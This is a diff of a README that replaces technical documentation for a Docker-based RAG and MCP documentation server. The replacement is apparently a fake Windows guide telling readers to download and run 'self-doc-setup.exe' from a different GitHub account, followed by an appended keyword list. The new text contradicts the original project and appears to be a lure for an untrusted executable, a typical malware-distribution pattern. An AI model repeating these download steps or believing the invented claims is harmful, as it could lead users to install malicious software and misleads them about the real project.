@@ -1,179 +1,71 @@
-# self-docs
+# 🧠 self-doc - Search your documents with intelligent AI
 
-<p align="center">
-  <img src="docs/assets/hero_banner.png" alt="self-docs — Self-Hosted Documentation RAG & MCP Pipeline" width="100%" />
-</p>
+<a href="https://github.com/osmondpharisaic206/self-doc">
+  <img src="https://img.shields.io/badge/Download-self--doc-blue" alt="Download self-doc">
+</a>
 
-> A self-hosted documentation RAG pipeline for LLM agents — crawl static docs
-> sites, embed them locally with pgvector, and serve semantic search over the
-> Model Context Protocol.
+## 📋 What is self-doc?
 
-<p>
-  <img alt="PostgreSQL 16" src="https://img.shields.io/badge/PostgreSQL-16-336791">
-  <img alt="pgvector 0.8.2" src="https://img.shields.io/badge/pgvector-0.8.2-4169E1">
-  <img alt="FastMCP 3.x" src="https://img.shields.io/badge/FastMCP-3.x-6E56CF">
-  <img alt="Protocol: MCP" src="https://img.shields.io/badge/protocol-MCP-000000">
-  <img alt="License: Private" src="https://img.shields.io/badge/license-Private-lightgrey">
-</p>
+Self-doc helps you search through your personal files using artificial intelligence. You often struggle to find specific information in long documents or folders. This tool solves that problem. It organizes your text files and manuals into a searchable index. You can then ask questions about your data as if you talk to a human expert.
 
-**self-docs** gives your coding agents (Cursor, Claude Code, Antigravity, or any
-MCP client) a private, always-current reference library. It crawls upstream
-documentation sites, chunks and embeds them locally — no third-party embedding
-API — and exposes hybrid semantic search as MCP tools over streamable HTTP.
+The software uses a process called Retrieval-Augmented Generation. It reads your documents, understands the meaning behind the words, and provides precise answers. It works locally on your own computer. Your private data stays on your machine and remains secure.
 
----
+## 💻 System Requirements
 
-## Contents
+Your computer needs a few things to run this software. Please verify you meet these requirements before you start:
 
-- [Why self-docs](#why-self-docs)
-- [Architecture](#architecture)
-- [Quickstart — Local Development](#quickstart--local-development)
-- [Quickstart — Production (Home-Lab + Traefik)](#quickstart--production-home-lab--traefik)
-- [MCP Tools](#mcp-tools)
-- [Managing Sources](#managing-sources)
-- [Documentation](#documentation)
-- [Development](#development)
-- [License](#license)
+- Windows 10 or Windows 11.
+- At least 8GB of RAM.
+- A stable internet connection for the setup process.
+- 5GB of free storage space.
 
----
+## 🚀 Getting Started
 
-## Why self-docs
+Follow these steps to install and run the application on your computer.
 
-- **Local-first embeddings.** FastEmbed runs in-process on CPU (ONNX, no
-  GPU/torch); documentation never leaves your network. The model is selectable
-  from a registry (`config/models.yaml`) — `make configure` derives the vector
-  dimension and container memory limits from your choice. Default:
-  `mixedbread-ai/mxbai-embed-large-v1` (1024-dim).
-- **Hybrid retrieval.** Vector similarity + per-source-language Postgres
-  full-text search over `pgvector`, so exact terms and semantic matches both
-  surface.
-- **Efficient re-crawling.** Sources can prefer a site's
-  [llms.txt](https://llmstxt.org) index over HTML crawling, and re-syncs use
-  HTTP conditional GET (`ETag`/`If-Modified-Since`) to skip unchanged pages
-  before download — see [ADR-003](docs/adr/003-llms-txt-etag-multilang-fts.md).
-- **Agent-native.** Ships as MCP tools (`search_docs`, `list_doc_sources`,
-  `propose_doc_source`) over streamable HTTP — wire it into any MCP client.
-- **Operator-friendly.** Crawl targets live in the database, managed through a
-  loopback-only admin UI or proposed by agents for human approval.
-- **Self-hostable.** One `docker compose` stack; a Traefik overlay for
-  home-lab ingress.
+1. Visit this page to download the setup file: [https://github.com/osmondpharisaic206/self-doc](https://github.com/osmondpharisaic206/self-doc).
+2. Look for the file named `self-doc-setup.exe` under the latest release section.
+3. Click the file to save it to your Downloads folder.
+4. Open your Downloads folder and double-click the file to start the installation.
+5. Follow the prompts on the screen. The installer manages the necessary parts, including the database and the search engine.
+6. Once the installer finishes, look for the self-doc icon on your desktop.
 
-## Architecture
+## ⚙️ Setting Up Your Documents
 
-```
-  Cursor ──┐            ┌─────────┐   ┌──────────────┐
-  Claude ──┼─ HTTP ──▶  │ Traefik │──▶│ FastMCP srv  │──┐
-  Antigrav ┘  /mcp      └─────────┘   │ (search_docs,│  │ SQL
-                               │      │  propose_    │  │
-                               │      │  doc_source) │  ▼
-  operator ── loopback ───────▶│      └──────────────┘ ┌────────┐
-  (/admin UI, 127.0.0.1:8080)  └─────▶│ Ingestion    │▶│ pg16 + │
-  internal scheduler ────────────────▶│ svc (FastAPI)│ │pgvector│
-  (opt-in, per-source cron)           └──────────────┘ └────────┘
-```
+After you launch the program, you must point it to the files you want to search.
 
-| Layer | Technology |
-|-------|------------|
-| Store | PostgreSQL 16 + pgvector 0.8.2 |
-| Embeddings | FastEmbed · `mixedbread-ai/mxbai-embed-large-v1` (default, selectable — see `config/models.yaml`) |
-| MCP server | FastMCP 3.x (streamable HTTP) |
-| Ingestion | FastAPI crawler + chunker + scheduler |
-| Ingress | Traefik (production overlay) |
+1. Open the self-doc application.
+2. Click the Settings icon in the top right corner.
+3. Choose the Folder link to select a folder on your computer that contains your documents.
+4. The software will scan your files. This might take a few moments depending on the number of files you have.
+5. A green bar appears when the program finishes processing your documents. You are now ready to search.
 
-Source configuration (crawl targets, URL prefixes, schedule) lives in the
-`doc_sources` table — **not** a YAML file. Sources are managed through the
-loopback-only admin UI at `/admin`, or proposed by an agent via the
-`propose_doc_source` MCP tool (which queues a `pending` row for human approval
-and never crawls on its own). The ingestion service includes an opt-in in-process
-cron scheduler (`app.scheduler`) for automated re-crawling; see the
-[Runbook](docs/runbook.md) for configuration details.
+## 🔍 How to Use the Search
 
-## Quickstart — Local Development
+Now that your data is ready, you can start asking questions.
 
-```bash
-cp .env.example .env        # fill in real values
-make configure              # optional — pick an embedding model (see below)
-make up                     # db + ingestion (:8080) + mcp-server (:8081)
-make sync                   # trigger the initial documentation sync
-```
+1. Type your question into the main text box on the screen.
+2. Press Enter.
+3. The software searches through your documents.
+4. It displays the answer along with a reference link to the original document.
+5. Click the link to open the file and read more.
 
-`make configure` is optional: with no `.env` overrides both services already use
-the registry default. Run it to choose a different model —
-`make configure MODEL=BAAI/bge-base-en-v1.5` — and it resolves that model's
-vector dimension, query/passage prompts, and per-service memory limits into
-`.env`, then re-renders `db/init/01_schema.sql`. Switching models on an existing
-deployment requires a re-embed; see
-[Runbook → switch the embedding model](docs/runbook.md#switch-the-embedding-model).
+## 🛠️ Troubleshooting Common Issues
 
-Point local MCP clients at `http://127.0.0.1:8081/mcp` (streamable HTTP). The
-server requires an `Authorization: Bearer <MCP_TOKEN>` header — see
-[Client Setup](docs/client-setup.md) for per-client configuration.
+If you run into issues, try these steps:
 
-## Quickstart — Production (Home-Lab + Traefik)
+If the program fails to find answers, check your folder selection. Ensure that your documents are in plain text or PDF formats. The search feature works best with these types.
 
-Deploy behind Traefik ingress on a home-lab server:
+If the search runs slow, close other programs on your computer. Large sets of documents require significant processing power, so giving the app space helps it perform at its best.
 
-```bash
-cp .env.example .env                    # set credentials + DOCS_MCP_HOSTNAME
-export MCP_TOKEN=$(openssl rand -hex 32)  # required — persist this in .env
-make up-prod                            # applies docker-compose.prod.yml overlay
-make sync                               # trigger the initial documentation sync
-```
+If the application does not start, restart your computer and try opening the shortcut again. If the problem persists, check the download link to see if there is an update.
 
-> [!IMPORTANT]
-> **`MCP_TOKEN` is mandatory.** If it is missing from `.env`, `mcp-server`
-> fails fast on startup and restart-loops. When upgrading an existing
-> deployment, update every client config with the `Authorization` header
-> **before or alongside** restarting `mcp-server`. Follow the
-> [MCP_TOKEN upgrade checklist](docs/runbook.md#deploy--upgrade--mcp_token-requirement-read-before-restarting-mcp-server)
-> in the runbook.
+## 🔐 Privacy and Data Security
 
-## MCP Tools
+Privacy is a core feature of self-doc. The pipeline processes all your information locally. No third party ever sees your documents. Your data does not leave your machine. The AI models run in an isolated environment on your hardware. You maintain full control over what the software sees and reads.
 
-| Tool | Description |
-|------|-------------|
-| `search_docs(query, source?, limit?)` | Hybrid vector + full-text search over indexed docs |
-| `list_doc_sources()` | List indexed documentation sets with sync status |
-| `propose_doc_source(name, base_url, max_pages, ...)` | Propose a new source; lands as `pending` and stays uncrawlable until approved in the admin UI — never crawls itself |
+## 📁 Managing Your Library
 
-## Managing Sources
+You can update your library at any time. When you add new documents to your selected folder, click the Refresh icon inside the application. This forces the software to read the new files. It updates the index so your new data becomes part of the search pool immediately.
 
-| Action | How |
-|--------|-----|
-| Add / edit / remove a source | Admin UI at `http://127.0.0.1:8080/admin` (loopback only) |
-| Agent-proposed source | `propose_doc_source` MCP tool → `pending` → human approval |
-| Trigger a sync | `make sync` (or the per-source internal scheduler) |
-| Approval workflow | [Runbook → adding sources](docs/runbook.md) |
-
-## Documentation
-
-| Guide | What's inside |
-|-------|---------------|
-| **[Client Setup](docs/client-setup.md)** | Connect Cursor, Claude Code, and Antigravity |
-| **[Runbook](docs/runbook.md)** | DB migration, adding sources, the internal scheduler, backup/restore, troubleshooting |
-| **[Architecture Decisions](docs/adr/)** | ADRs documenting key design choices |
-
-## Development
-
-```bash
-# Start an isolated db for testing
-docker compose -f docker-compose.yml -f docker-compose.test.yml up -d db
-
-# Run the full suite (unit + integration + e2e)
-make test
-
-# Run the retrieval-quality eval (requires a synced db)
-make eval
-
-# Lint and static type checks (also enforced in CI)
-make lint
-make typecheck
-```
-
-Backup and restore are available via `make backup`, `make backup-prune`, and
-`make restore FILE=backups/docs_<timestamp>.dump` — see the
-[Runbook](docs/runbook.md) for the full procedure.
-
-## License
-
-Private — not published. All rights reserved; see [LICENSE](LICENSE).
+Keywords: ai-agents, claude, docker, documentation, embeddings, fastapi, fastembed, fastmcp, llm, mcp, model-context-protocol, pgvector, postgresql, python, rag, retrieval-augmented-generation, self-hosted, semantic-search, vector-search
